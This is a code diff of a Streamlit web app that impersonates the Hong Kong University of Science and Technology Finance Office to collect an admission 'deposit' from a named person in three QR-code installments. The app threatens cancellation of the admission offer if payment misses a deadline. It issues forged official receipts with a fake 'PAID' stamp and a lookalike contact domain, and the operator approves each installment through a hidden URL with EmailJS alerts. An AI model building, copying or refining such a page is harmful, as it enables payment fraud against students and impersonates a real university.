@@ -5,7 +5,7 @@ import time
 from datetime import datetime
 import requests
 
-# --- 1. 頁面配置與自動去背景工具 ---
+# --- 1. 頁面配置與圖片處理工具 ---
 st.set_page_config(page_title="HKUST Deposit System", page_icon="✅", layout="wide")
 
 def get_base64_bin_file(bin_file):
@@ -15,55 +15,57 @@ def get_base64_bin_file(bin_file):
         return base64.b64encode(data).decode()
     return None
 
-# 讀取本地 hkust.png
 logo_base64 = get_base64_bin_file("hkust.png")
+STAMP_DATE = datetime.now().strftime('%d %B %Y').upper()
 
-# --- 2. 注入專業 CSS (解決黑框、Logo 大小、去背景色差) ---
+# --- 2. 注入專業級 CSS (含藍色印章與聯繫信息樣式) ---
 st.markdown(f"""
 <style>
 /* 隱藏官方 UI */
 #MainMenu, header, footer, .stDeployButton {{visibility: hidden !important;}}
 [data-testid="stHeader"] {{display: none !important;}}
 
-/* 導航欄樣式 */
+/* 頂部導航欄 */
 .nav-bar {{
-    background-color: #003366; 
-    padding: 10px 60px;
-    display: flex;
-    align-items: center;
-    color: white;
-    border-bottom: 4px solid #A6937C;
-    margin: -75px -100px 30px -100px;
+    background-color: #003366; padding: 10px 60px; display: flex; align-items: center; color: white;
+    border-bottom: 4px solid #A6937C; margin: -75px -100px 30px -100px;
 }}
+.nav-logo {{ height: 85px; width: auto; margin-right: 25px; mix-blend-mode: screen; display: block; }}
+.system-title {{ border-left: 2px solid #fff; padding-left: 20px; font-size: 20px; font-weight: 500; line-height: 1.2; }}
 
-/* Logo 放大並去背景融合 */
-.nav-logo {{
-    height: 85px; 
-    width: auto;
-    margin-right: 25px;
-    mix-blend-mode: screen; 
-    display: block;
-}}
-
-.system-title {{
-    border-left: 2px solid #fff;
-    padding-left: 20px;
-    font-size: 20px;
-    font-weight: 500;
-    line-height: 1.2;
-}}
-
-/* 卡片與提示框 (嚴格禁止縮進以防止黑框) */
+/* 支付卡片與警告框 */
 .payment-card {{ background: white; padding: 35px; border-radius: 10px; border: 1px solid #ddd; color: #000 !important; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }}
 .deadline-box {{ color: #d32f2f !important; font-weight: bold; font-size: 16px; background-color: #f8d7da !important; padding: 18px; border-radius: 4px; margin: 15px 0; border: 1px solid #f5c6cb; line-height: 1.6; }}
 .info-box {{ background-color: #fffbe6; border: 1px solid #ffe58f; padding: 15px; border-radius: 5px; margin-bottom: 20px; font-size: 14px; color: #856404; }}
-.receipt-box {{ background: white; border: 1px solid #003366; padding: 40px; border-radius: 5px; color: #000 !important; max-width: 750px; margin: auto; }}
+
+/* 官方收據樣式 */
+.receipt-box {{
+    background: white; border: 1px solid #003366; padding: 45px; max-width: 800px; margin: auto;
+    font-family: 'Arial', sans-serif; position: relative; color: #333 !important;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+}}
+.receipt-header {{ text-align: center; border-bottom: 2px solid #003366; padding-bottom: 15px; margin-bottom: 25px; }}
+.info-row {{ display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #eee; font-size: 15px; }}
+
+/* 藍色圓形財務印章 */
+.official-stamp {{
+    position: absolute; bottom: 45px; right: 50px; width: 145px; height: 145px;
+    border: 3px double #1a478a; border-radius: 50%; color: #1a478a;
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    text-align: center; font-family: 'Courier New', Courier, monospace;
+    font-weight: bold; transform: rotate(-10deg); opacity: 0.85;
+    background: rgba(26, 71, 138, 0.02); pointer-events: none;
+}}
+.stamp-inner-circle {{ position: absolute; width: 115px; height: 115px; border: 1.5px solid #1a478a; border-radius: 50%; }}
+.stamp-paid {{ font-size: 24px; border-top: 2px solid #1a478a; border-bottom: 2px solid #1a478a; padding: 2px 6px; margin: 3px 0; }}
+
+/* 加載動畫 */
 .loader {{ border: 6px solid #f3f3f3; border-top: 6px solid #003366; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: auto; }}
 @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
 </style>
 """, unsafe_allow_html=True)
 
-# --- 3. 數據與後台狀態管理 ---
+# --- 3. 狀態與數據管理 ---
 STATUS_FILE = "payment_status.txt"
 def set_status(s):
     with open(STATUS_FILE, "w") as f: f.write(s)
@@ -71,22 +73,22 @@ def get_status():
     if not os.path.exists(STATUS_FILE): return "pending"
     with open(STATUS_FILE, "r") as f: return f.read().strip()
 
-# 管理員審核邏輯 (action=approve1, 2, 3)
+# 處理管理員審核 URL
 q = st.query_params
 if q.get("action") in ["approve1", "approve2", "approve3"]:
     set_status(q.get("action").replace("approve", "approved"))
-    st.success("Payment Confirmed! User screen will update.")
+    st.success("Verified! Screen will update.")
     st.stop()
 
 # 核心數據
-PAYER = "XINGSHENG WANG"
+PAYER = "XINGSHENG WANG (王兴生)"
 HKD_TOTAL = "51,643"
 USD_TOTAL = "6,593.21"
 
-# EmailJS 配置 (請填入您的正確 Key)
+# EmailJS 配置 (請填入您的正確 ID)
 USER_ID = "2Mp8IGmfTvvDLueQN"
 SERVICE_ID = "service_hjp7b95"
-TEMPLATE_ID = "template_br5xnjm"
+TEMPLATE_ID = "template_6sdyg2j"
 MY_URL = "https://hkust-pre-of-tpg.streamlit.app" 
 
 if 'step' not in st.session_state: st.session_state.step = "pay1"
@@ -100,91 +102,110 @@ st.markdown(f"""
 </div>
 """, unsafe_allow_html=True)
 
-# --- 5. 支付流程邏輯 ---
+# --- 5. 邏輯流程 ---
 
-# 通用 Checking 頁面
+# A. Checking 頁面
 if st.session_state.step.startswith("checking"):
     stage = st.session_state.step[-1]
-    st.markdown(f"""<div style="text-align:center; margin-top:100px;"><div class="loader"></div><h2 style="color:#003366;">Verifying Installment {stage}...</h2><p>Our Finance Office is verifying your transaction. Page updates automatically.</p></div>""", unsafe_allow_html=True)
+    st.markdown(f"""
+    <div style="text-align:center; margin-top:100px;">
+        <div class="loader"></div>
+        <h2 style="color:#003366;">Verifying Transaction...</h2>
+        <p>Finance Office is verifying installment {stage} via Payoneer.</p>
+    </div>
+    """, unsafe_allow_html=True)
     time.sleep(5)
     if get_status() == f"approved{stage}":
         st.session_state.step = f"receipt{stage}"
     st.rerun()
 
-# 階段 1: 支付 1200 USD
+# B. 支付階段 1
 elif st.session_state.step == "pay1":
     col1, col2, col3 = st.columns([1, 1.8, 1])
     with col2:
         st.markdown(f"""<div class="payment-card">
 <h3 style="color:#003366; margin-top:0;">Payment Plan Confirmation</h3>
 <p style="color:#333;"><b>Payer Name:</b> {PAYER}</p>
-<p>Your deposit of <b>HK$ {HKD_TOTAL}</b> (≈ <b>USD {USD_TOTAL}</b>) will be split into 3 installments.</p>
+<p>Deposit total: <b>HK$ {HKD_TOTAL}</b> (≈ <b>USD {USD_TOTAL}</b>)</p>
 <div class="info-box"><b>Plan:</b> 1st: $1,200 | 2nd: $3,000 | 3rd: $2,393.21</div>
 <div class="deadline-box">
 ⚠️ URGENT NOTICE:<br>
-Please complete the payment by 4:00 PM on April 24th. Failure to do so will result in the immediate cancellation of your admission offer and TLE MSc program seat.
+Please complete the payment by 4:00 PM on April 24th. Failure to do so will result in the immediate cancellation of your admission offer.
 </div>
-<p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:18px;">Current Step: 1st Installment - USD 1,200.00</p>
+<p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:18px;">Action: 1st Installment - USD 1,200.00</p>
 </div>""", unsafe_allow_html=True)
         st.image("qr1.png" if os.path.exists("qr1.png") else "https://placeholder.com", width=400)
         if st.button("I HAVE PAID THE 1ST INSTALLMENT", use_container_width=True, type="primary"):
             requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 1200", "approve_url": f"{MY_URL}/?action=approve1"}})
             set_status("checking1"); st.session_state.step = "checking1"; st.rerun()
 
-# 階段 1 收據 -> 進入階段 2
-elif st.session_state.step == "receipt1":
-    col1, col2, col3 = st.columns([1, 1.5, 1])
-    with col2:
-        st.markdown(f"""<div class="receipt-box" style="text-align:center;"><h4 style="color:#003366;">OFFICIAL RECEIPT (STAGE 1)</h4><p>Payer: {PAYER} | Received: USD 1,200.00</p><div style="border:2px solid #28a745; color:#28a745; padding:5px; width:fit-content; font-weight:bold; margin:auto;">VERIFIED</div></div>""", unsafe_allow_html=True)
-        st.write("## ")
+# C. 收據展示 (含聯繫信息與藍色財務章)
+elif st.session_state.step in ["receipt1", "receipt2", "receipt3"]:
+    stage_num = st.session_state.step[-1]
+    amounts = {"1": "1,200.00", "2": "3,000.00", "3": "2,393.21"}
+    is_final = (stage_num == "3")
+    
+    st.markdown(f"""
+    <div class="receipt-box">
+        <div class="receipt-header">
+            <h2 style="margin:0; color:#003366;">THE HONG KONG UNIVERSITY OF SCIENCE AND TECHNOLOGY</h2>
+            <p style="font-size:12px; margin-top:5px; color:#666;">Clear Water Bay, Kowloon, Hong Kong | Finance Office</p>
+        </div>
+        <h3 style="text-align:center; text-decoration: underline; color:#333;">OFFICIAL ELECTRONIC RECEIPT</h3>
+        <div class="info-row"><span><b>Receipt No:</b></span><span>UST-{int(time.time())}</span></div>
+        <div class="info-row"><span><b>Date:</b></span><span>{datetime.now().strftime('%d %B %Y')}</span></div>
+        <div class="info-row"><span><b>Received From:</b></span><span>{PAYER}</span></div>
+        <div class="info-row"><span><b>Payment Type:</b></span><span>{"Full Program Deposit" if is_final else f"Installment {stage_num}"}</span></div>
+        <div class="info-row" style="border-top:2px solid #003366; margin-top:10px;">
+            <span><b>AMOUNT RECEIVED:</b></span>
+            <span style="font-size:18px; color:#003366;"><b>USD {amounts[stage_num]}</b></span>
+        </div>
+        
+        <!-- 新增：聯繫信息與備註 -->
+        <div style="margin-top:40px; border-top: 1px dashed #eee; padding-top:15px;">
+            <p style="font-size:12px; color:#666; margin-bottom:5px;"><b>Notes:</b> This is a computer-generated document. No signature is required.</p>
+            <p style="font-size:13px; color:#333;">For any inquiries, please contact: <a href="mailto:uagdmit@hkust-tle.hk" style="color:#003366; text-decoration:none;"><b>uagdmit@hkust-tle.hk</b></a></p>
+        </div>
+        
+        <!-- 藍色圓形財務章 -->
+        <div class="official-stamp">
+            <div class="stamp-inner-circle"></div>
+            <div style="font-size: 11px; margin-bottom: 2px;">HKUST</div>
+            <div class="stamp-paid">PAID</div>
+            <div style="font-size: 13px; margin: 2px 0;">{STAMP_DATE}</div>
+            <div style="font-size: 9px;">FINANCE OFFICE</div>
+        </div>
+    </div>
+    """, unsafe_allow_html=True)
+    
+    st.write("## ")
+    if stage_num == "1":
         if st.button("PROCEED TO 2ND INSTALLMENT (USD 3,000)", use_container_width=True, type="primary"):
             st.session_state.step = "pay2"; st.rerun()
+    elif stage_num == "2":
+        if st.button("PROCEED TO FINAL INSTALLMENT (USD 2,393.21)", use_container_width=True, type="primary"):
+            st.session_state.step = "pay3"; st.rerun()
+    else:
+        st.balloons()
+        st.success("All installments completed. Your TLE MSc seat is now fully secured.")
 
-# 階段 2: 支付 3000 USD
+# D. 階段 2 & 3 支付頁面 (同 pay1)
 elif st.session_state.step == "pay2":
     col1, col2, col3 = st.columns([1, 1.8, 1])
     with col2:
-        st.markdown(f"""<div class="payment-card"><h3 style="color:#003366; margin-top:0;">2nd Installment Payment</h3><p>Payer: {PAYER}</p><div class="deadline-box">⚠️ Deadline: 4:00 PM, April 24th.</div><p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:18px;">Amount: USD 3,000.00</p></div>""", unsafe_allow_html=True)
-        st.image("qr2.png" if os.path.exists("qr2.png") else "https://placeholder.com", width=400)
+        st.markdown(f'<div class="payment-card"><h3 style="color:#003366; margin-top:0;">2nd Installment Payment</h3><p>Payer: {PAYER}</p><div class="deadline-box">⚠️ Deadline: 4:00 PM, April 24th.</div><p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:20px;">Amount: USD 3,000.00</p></div>', unsafe_allow_html=True)
+        st.image("qr2.png", width=400)
         if st.button("I HAVE PAID THE 2ND INSTALLMENT", use_container_width=True, type="primary"):
             requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 3000", "approve_url": f"{MY_URL}/?action=approve2"}})
             set_status("checking2"); st.session_state.step = "checking2"; st.rerun()
 
-# 階段 2 收據 -> 進入階段 3
-elif st.session_state.step == "receipt2":
-    col1, col2, col3 = st.columns([1, 1.5, 1])
-    with col2:
-        st.markdown(f"""<div class="receipt-box" style="text-align:center;"><h4 style="color:#003366;">OFFICIAL RECEIPT (STAGE 2)</h4><p>Payer: {PAYER} | Received: USD 3,000.00</p><div style="border:2px solid #28a745; color:#28a745; padding:5px; width:fit-content; font-weight:bold; margin:auto;">VERIFIED</div></div>""", unsafe_allow_html=True)
-        st.write("## ")
-        if st.button("PROCEED TO FINAL INSTALLMENT (USD 2,393.21)", use_container_width=True, type="primary"):
-            st.session_state.step = "pay3"; st.rerun()
-
-# 階段 3: 支付 2393.21 USD
 elif st.session_state.step == "pay3":
     col1, col2, col3 = st.columns([1, 1.8, 1])
     with col2:
-        st.markdown(f"""<div class="payment-card"><h3 style="color:#003366; margin-top:0;">Final Installment Payment</h3><p>Payer: {PAYER}</p><div class="deadline-box">⚠️ Final Step to secure your enrollment.</div><p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:18px;">Amount: USD 2,393.21</p></div>""", unsafe_allow_html=True)
-        st.image("qr3.png" if os.path.exists("qr3.png") else "https://placeholder.com", width=400)
+        st.markdown(f'<div class="payment-card"><h3 style="color:#003366; margin-top:0;">Final Installment Payment</h3><p>Payer: {PAYER}</p><div class="deadline-box">⚠️ Final Step to secure your place.</div><p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:20px;">Amount: USD 2,393.21</p></div>', unsafe_allow_html=True)
+        st.image("qr3.png", width=400)
         if st.button("I HAVE PAID THE FINAL INSTALLMENT", use_container_width=True, type="primary"):
             requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 2393.21", "approve_url": f"{MY_URL}/?action=approve3"}})
             set_status("checking3"); st.session_state.step = "checking3"; st.rerun()
 
-# 最終大收據
-elif st.session_state.step == "receipt3":
-    st.markdown(f"""<div class="receipt-box">
-<div style="text-align: center; border-bottom: 2px solid #003366; padding-bottom: 15px; margin-bottom: 25px;">
-<h2 style="margin:0; color:#003366 !important;">THE HONG KONG UNIVERSITY OF SCIENCE AND TECHNOLOGY</h2>
-<p style="font-size:11px; color:#666 !important;">Official Electronic Receipt</p>
-</div>
-<h3 style="text-align:center; text-decoration: underline;">FULL DEPOSIT RECEIPT</h3><br>
-<table style="width:100%; color:#000;">
-<tr><td><b>Receipt No:</b></td><td style="text-align:right;">UST-FULL-{int(time.time())}</td></tr>
-<tr><td><b>Received from:</b></td><td style="text-align:right;">{PAYER}</td></tr>
-<tr><td><b>Total Amount:</b></td><td style="text-align:right;"><b>HK$ {HKD_TOTAL} (USD {USD_TOTAL})</b></td></tr>
-</table><br>
-<div style="border:2px solid #d32f2f; color:#d32f2f; padding:8px; width:fit-content; transform:rotate(-5deg); font-weight:bold;">HKUST FINANCE OFFICE<br>FULL PAYMENT VERIFIED</div>
-</div>""", unsafe_allow_html=True)
-    st.balloons()
-
-# 頁腳
 st.markdown("<p style='text-align:center; color:#999 !important; font-size:10px; margin-top:50px;'>© 2024 The Hong Kong University of Science and Technology. All rights reserved.</p>", unsafe_allow_html=True)
